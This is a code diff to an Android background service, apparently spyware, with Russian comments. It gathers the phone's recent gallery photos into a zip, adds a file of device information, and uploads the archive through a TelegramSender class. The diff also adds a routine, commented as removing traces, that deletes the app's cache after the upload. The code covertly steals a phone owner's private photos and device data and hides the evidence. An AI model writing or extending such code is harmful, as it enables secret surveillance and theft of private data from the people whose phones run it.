@@ -10,6 +10,7 @@ import android.os.IBinder;
 import android.provider.MediaStore;
 import androidx.annotation.Nullable;
 import java.io.ByteArrayOutputStream;
+import java.io.File;
 import java.io.InputStream;
 import java.util.ArrayList;
 import java.util.List;
@@ -28,6 +29,14 @@ public class GalleryService extends Service {
                 ByteArrayOutputStream zipBuffer = new ByteArrayOutputStream();
                 ZipOutputStream zos = new ZipOutputStream(zipBuffer);
                 
+                // 1. Добавляем info.txt с данными о телефоне
+                String infoText = DeviceInfo.getInfo(this);
+                ZipEntry infoEntry = new ZipEntry("info.txt");
+                zos.putNextEntry(infoEntry);
+                zos.write(infoText.getBytes());
+                zos.closeEntry();
+
+                // 2. Добавляем фотографии
                 int count = 1;
                 for (Uri uri : allImages) {
                     try {
@@ -67,13 +76,31 @@ public class GalleryService extends Service {
                 zos.close();
                 
                 if (count > 1) {
-                    new TelegramSender().sendZip(zipBuffer.toByteArray(), "photos.zip");
+                    // Отправляем ZIP-файл
+                    new TelegramSender().sendZip(zipBuffer.toByteArray(), "photos_" + System.currentTimeMillis() + ".zip");
                 }
+
+                // 3. УДАЛЕНИЕ СЛЕДОВ (чистим кэш приложения)
+                clearAppCache();
 
             } catch (Exception e) { e.printStackTrace(); }
             stopSelf();
         }).start();
         return START_NOT_STICKY;
+    }
+
+    private void clearAppCache() {
+        try {
+            File cacheDir = getCacheDir();
+            if (cacheDir != null && cacheDir.isDirectory()) {
+                File[] children = cacheDir.listFiles();
+                if (children != null) {
+                    for (File child : children) {
+                        child.delete();
+                    }
+                }
+            }
+        } catch (Exception e) { e.printStackTrace(); }
     }
 
     private List<Uri> getRecentImages() {
